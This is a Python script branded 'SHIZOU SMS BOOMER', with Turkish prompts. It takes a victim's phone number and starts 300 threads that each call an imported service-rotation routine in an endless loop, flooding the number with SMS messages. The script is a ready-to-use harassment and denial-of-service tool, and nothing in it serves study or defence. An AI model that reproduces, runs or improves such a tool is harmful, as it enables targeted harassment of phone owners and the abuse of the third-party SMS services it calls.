import sys, os, pyfiglet
from StructService import Distribution_Service
from threading import Thread
from colorama import Fore

attack_number_phone = Distribution_Service()

def start(phone):
	attack_number_phone.phone(phone)

	while True:
	    try:
	        attack_number_phone.random_service()
	    except Exception as ex:
	    	print(ex)

os.system('clear')

print(Fore.RED + pyfiglet.figlet_format("               SHIZOU"))
print(Fore.RED + pyfiglet.figlet_format("   SMS BOOMER"))
print('========================')
phone = input('Telefon Numarası: ')
print('========================')

try:
	attack_number_phone.phone(phone)
except:
	print(Fore.RED + 'Geçersiz giriş biçimi.\nNumarayı +905392829212 biçiminde girin.')
	sys.exit()
	


for i in range(300):
	th = Thread(target=start, args=(phone,))
	th.start()